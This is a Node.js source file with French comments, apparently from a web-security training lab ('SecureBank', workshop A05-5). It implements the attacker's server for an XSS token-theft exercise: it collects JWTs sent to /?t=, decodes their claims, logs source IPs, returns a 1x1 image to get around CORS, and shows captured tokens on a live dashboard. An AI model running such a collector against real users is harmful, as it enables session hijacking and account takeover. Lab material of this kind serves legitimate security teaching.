// 💀 hackerwebsite — collecteur de tokens pour l'atelier A05-5 (XSS -> vol de token).
// Service de DÉMONSTRATION du lab SecureBank : il simule le serveur de l'attaquant.
// - GET /?t=<token>  : enregistre le token exfiltré (répond une image 1x1).
// - GET /            : affiche la page qui LISTE les tokens capturés.
// Serveur volontairement minimal (aucune dépendance), à ne jamais exposer ailleurs.

const http = require('http');
const url = require('url');

const captures = []; // { token, time, ip, claims }

// Décode le payload d'un JWT (partie du milieu, base64url) sans vérifier la signature.
function decodeJwt(token) {
  try {
    const parts = String(token).split('.');
    if (parts.length < 2) return null;
    const json = Buffer.from(parts[1].replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
    return JSON.parse(json);
  } catch (e) {
    return null;
  }
}

function esc(s) {
  return String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
}

function page() {
  const rows = captures.slice().reverse().map((c, idx) => {
    const n = captures.length - idx;
    const claims = c.claims
      ? `sub=<b>${esc(c.claims.sub || '?')}</b> · role=<b>${esc(c.claims.role || '?')}</b>`
      : '<span class="muted">(non décodable)</span>';
    return `<tr>
        <td>${n}</td>
        <td>${esc(c.time)}</td>
        <td class="tok">${esc(c.token)}</td>
        <td>${claims}</td>
        <td>${esc(c.ip)}</td>
      </tr>`;
  }).join('');

  const body = captures.length
    ? `<table>
         <thead><tr><th>#</th><th>Heure (UTC)</th><th>Token (JWT)</th><th>Payload décodé</th><th>Source</th></tr></thead>
         <tbody>${rows}</tbody>
       </table>`
    : `<div class="empty">Aucun token pour l'instant.<br>Déclenchez l'atelier A05-5 : l'admin ouvre « Messages support », et son token atterrit ici.</div>`;

  return `<!doctype html><html lang="fr"><head>
    <meta charset="utf-8">
    <meta http-equiv="refresh" content="2">
    <title>hackerwebsite — tokens capturés</title>
    <style>
      body{background:#0b0e14;color:#d8dee9;font-family:ui-monospace,Menlo,Consolas,monospace;margin:0;padding:24px}
      h1{color:#ff5555;font-size:20px;margin:0 0 4px}
      p.sub{color:#6b7280;margin:0 0 20px;font-size:13px}
      .count{color:#ffb86c}
      table{width:100%;border-collapse:collapse;font-size:13px}
      th,td{border-bottom:1px solid #1c2330;padding:8px 10px;text-align:left;vertical-align:top}
      th{color:#9aa5b1;font-weight:600;text-transform:uppercase;font-size:11px;letter-spacing:.05em}
      td.tok{color:#50fa7b;word-break:break-all;max-width:520px}
      .muted{color:#6b7280}
      .empty{color:#6b7280;padding:48px 0;text-align:center;line-height:1.6}
    </style></head><body>
    <h1>&#128128; hackerwebsite</h1>
    <p class="sub">Collecteur de tokens (démonstration lab SecureBank) — <span class="count">${captures.length}</span> token(s) capturé(s). Rafraîchissement auto toutes les 2 s.</p>
    ${body}
  </body></html>`;
}

const server = http.createServer((req, res) => {
  const q = url.parse(req.url, true);
  const t = q.query.t;

  if (t) {
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').toString();
    captures.push({
      token: t,
      time: new Date().toISOString().replace('T', ' ').slice(0, 19),
      ip,
      claims: decodeJwt(t),
    });
    console.log('[CAPTURE]', String(t).slice(0, 40) + '…', 'depuis', ip);
    // Réponse neutre (image 1x1) : la requête part même si le navigateur bloque la lecture (CORS).
    res.writeHead(200, { 'Content-Type': 'image/gif', 'Access-Control-Allow-Origin': '*' });
    res.end(Buffer.from('R0lGODlhAQABAAAAACwAAAAAAQABAAA=', 'base64'));
    return;
  }

  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(page());
});

server.listen(80, () => console.log('hackerwebsite en écoute sur :80'));
